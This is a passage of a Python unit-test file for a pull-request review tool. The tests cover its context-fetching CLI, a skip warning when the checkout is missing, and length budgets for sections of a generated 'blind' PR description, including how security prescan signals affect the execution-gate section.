            redirect_stdout(io.StringIO()),
        ):
            rc = main(
                [
                    "--fetch-context",
                    "--prepare-code-review",
                    "--input-coords",
                    str(coords_file),
                    "--require-blind-description",
                    str(blind),
                    "--output-context",
                    str(out_context),
                ]
            )
        self.assertEqual(rc, 0)
        self.assertEqual(prep.call_args.args[1], self.diff)
        self.assertEqual(prep.call_args.args[2], self.repo)
        context = json.loads(out_context.read_text(encoding="utf-8"))
        self.assertEqual(context["code_review_prep"], sentinel)
        self.assertIn("blind_sha256", context)
        prep_file = self.tmp / "code_review_prep.json"
        self.assertTrue(prep_file.is_file())
        self.assertEqual(json.loads(prep_file.read_text(encoding="utf-8")), sentinel)

    def test_cli_skips_with_warning_when_checkout_missing(self):
        coords_file = self.tmp / "pr_coords.json"
        coords_file.write_text(
            json.dumps({"owner": "o", "repo": "r", "pull_number": 7}),
            encoding="utf-8",
        )
        blind = self.tmp / "blind_description.md"
        blind.write_text("## Summary\nText.\n", encoding="utf-8")
        out_context = self.tmp / "pr_context.json"
        with (
            patch(
                "review_engine.fetch_pr_context",
                return_value=({"head_sha": ""}, {}),
            ),
            patch("review_engine.fetch_pr_stack", return_value=None),
            redirect_stdout(io.StringIO()),
        ):
            rc = main(
                [
                    "--fetch-context",
                    "--prepare-code-review",
                    "--input-coords",
                    str(coords_file),
                    "--require-blind-description",
                    str(blind),
                    "--output-context",
                    str(out_context),
                    "--repo-dir",
                    str(self.tmp / "missing"),
                ]
            )
        self.assertEqual(rc, 0)
        prep = json.loads(out_context.read_text(encoding="utf-8"))["code_review_prep"]
        self.assertTrue(prep["warnings"][0].startswith("--prepare-code-review skipped"))


_COMPLIANT_BLIND_MD = (
    "## Summary\n"
    "Adds exponential retry backoff to the HTTP client so transient 503 responses do not fail requests immediately.\n\n"
    "## Quality Assessment\n"
    "Focused change with full unit test coverage.\n\n"
    "## Security & Execution Gate\n"
    "- **Gate Verdict**: `SAFE_FOR_LOCAL_EXECUTION` (static pre-scan clean)\n\n"
    "## Changes\n"
    "- **`src/client.py`**: Adds exponential backoff loop.\n"
    "- **`tests/test_client.py`**: Covers retry cap and timeout.\n\n"
    "## Reviewer Focus & Risks\n"
    "- Verify max retry cap under timeout.\n"
)

_OVER_BUDGET_BLIND_MD = (
    "## Summary\n"
    "First sentence here. Second sentence here. Third sentence here. Fourth sentence here.\n\n"
    "## Quality Assessment\n"
    "First sentence here. Second sentence here.\n\n"
    "## Security & Execution Gate\n"
    "- **Gate Verdict**: `SAFE_FOR_LOCAL_EXECUTION`\n"
    "- **Static Pre-Scan**: `clean`\n"
    "- **Execution Risk Notes**: None.\n\n"
    "## Changes\n"
    + "".join(f"- **`src/file_{i}.py`**: Change {i}.\n" for i in range(1, 9))
    + "```markdown\n- Not a top-level bullet inside a fence\n```\n\n"
    "## Reviewer Focus & Risks\n"
    "- Risk one.\n"
    "- Risk two.\n"
    "- Risk three.\n"
    "- Risk four.\n"
)


class TestDescriptionBudgets(unittest.TestCase):
    def test_compliant_blind_description_has_no_warnings(self):
        self.assertIsInstance(DESCRIPTION_BUDGETS["Summary"], SectionBudget)
        self.assertEqual(
            check_description_budgets(_COMPLIANT_BLIND_MD, prescan_clean=True), []
        )

    def test_over_budget_sections_and_prescan_clean_gate(self):
        warnings_clean = check_description_budgets(
            _OVER_BUDGET_BLIND_MD, prescan_clean=True
        )
        self.assertEqual(
            warnings_clean,
            [
                "Budget: Summary: 4 sentences (max 3)",
                "Budget: Quality Assessment: 2 sentences (max 1)",
                "Budget: Security & Execution Gate: 3 lines (max 1)",
                "Budget: Changes: 8 bullets (max 6)",
                "Budget: Reviewer Focus & Risks: 4 bullets (max 3)",
            ],
        )

        warnings_not_clean = check_description_budgets(
            _OVER_BUDGET_BLIND_MD, prescan_clean=False
        )
        self.assertNotIn(
            "Budget: Security & Execution Gate: 3 lines (max 1)", warnings_not_clean
        )
        self.assertIn("Budget: Changes: 8 bullets (max 6)", warnings_not_clean)

    def test_cli_check_description_budgets_exits_zero_and_respects_coords(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            blind = tmp_path / "blind_description.md"
            coords = tmp_path / "pr_coords.json"
            blind.write_text(_OVER_BUDGET_BLIND_MD, encoding="utf-8")

            # Missing --input-coords: Security multi-line is allowed, Changes still flagged
            buf_no_coords = io.StringIO()
            with redirect_stdout(buf_no_coords):
                rc = main(["--check-description-budgets", str(blind)])
            self.assertEqual(rc, 0)
            self.assertIn(
                "Budget: Changes: 8 bullets (max 6)", buf_no_coords.getvalue()
            )
            self.assertNotIn(
                "Budget: Security & Execution Gate:", buf_no_coords.getvalue()
            )

            # Clean coords + SAFE_FOR_LOCAL_EXECUTION: Security multi-line is flagged
            coords.write_text(
                json.dumps({"security_prescan": {"signals": []}}), encoding="utf-8"
            )
            buf_clean = io.StringIO()
            with redirect_stdout(buf_clean):
                rc_clean = main(
                    [
                        "--check-description-budgets",
                        str(blind),
                        "--input-coords",
                        str(coords),
                    ]
                )
            self.assertEqual(rc_clean, 0)
            self.assertIn(
                "Budget: Security & Execution Gate: 3 lines (max 1)",
                buf_clean.getvalue(),
            )

            # Non-empty signals in coords: Security multi-line is allowed
            coords.write_text(
                json.dumps(
                    {
                        "security_prescan": {
                            "signals": [{"category": "x", "file_path": "a.py"}]
                        }
                    }
                ),
                encoding="utf-8",
            )
            buf_flagged = io.StringIO()
            with redirect_stdout(buf_flagged):
                rc_flagged = main(
                    [
                        "--check-description-budgets",
                        str(blind),
                        "--input-coords",
                        str(coords),
                    ]
                )
            self.assertEqual(rc_flagged, 0)
            self.assertNotIn(
                "Budget: Security & Execution Gate:", buf_flagged.getvalue()
            )

            # Non-SAFE gate verdict with clean signals: Security multi-line is allowed
            coords.write_text(
                json.dumps({"security_prescan": {"signals": []}}), encoding="utf-8"
            )
            blind.write_text(
                _OVER_BUDGET_BLIND_MD.replace(
                    "SAFE_FOR_LOCAL_EXECUTION", "REQUIRES_USER_CONFIRMATION"
                ),
                encoding="utf-8",
            )
            buf_confirm = io.StringIO()
            with redirect_stdout(buf_confirm):
                rc_confirm = main(
                    [
                        "--check-description-budgets",
                        str(blind),
                        "--input-coords",
                        str(coords),
                    ]
                )
            self.assertEqual(rc_confirm, 0)
            self.assertNotIn(
                "Budget: Security & Execution Gate:", buf_confirm.getvalue()
            )

    def test_fetch_context_prints_budget_lines_and_records_matching_sha256(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp_path = Path(tmp)
            blind = tmp_path / "blind_description.md"
            coords = tmp_path / "pr_coords.json"
            out_ctx = tmp_path / "pr_context.json"
            blind.write_text(_OVER_BUDGET_BLIND_MD, encoding="utf-8")
            coords.write_text(
                json.dumps(
                    {
                        "owner": "octocat",
                        "repo": "hello-world",
                        "pull_number": 42,
                        "head_sha": "abc123",
                        "security_prescan": {"signals": []},
                    }
                ),
                encoding="utf-8",
            )
            err_buf = io.StringIO()
            with (
                patch(
                    "review_engine.fetch_pr_context",
                    return_value=({"head_sha": "abc123", "base_ref": "main"}, {}),
                ),
                patch("review_engine.fetch_pr_stack", return_value=None),
                redirect_stdout(io.StringIO()),
                redirect_stderr(err_buf),
            ):
                rc = main(
                    [
                        "--fetch-context",
                        "--input-coords",
                        str(coords),
                        "--require-blind-description",
                        str(blind),
                        "--output-context",
                        str(out_ctx),
                    ]
                )
            self.assertEqual(rc, 0)
            stderr_out = err_buf.getvalue()
            self.assertIn("Budget: Changes: 8 bullets (max 6)", stderr_out)
            self.assertIn(
                "Budget: Security & Execution Gate: 3 lines (max 1)", stderr_out
            )
            ctx = json.loads(out_ctx.read_text(encoding="utf-8"))
            self.assertEqual(
                ctx["blind_sha256"],
                hashlib.sha256(_OVER_BUDGET_BLIND_MD.encode("utf-8")).hexdigest(),
            )


if __name__ == "__main__":
    unittest.main()
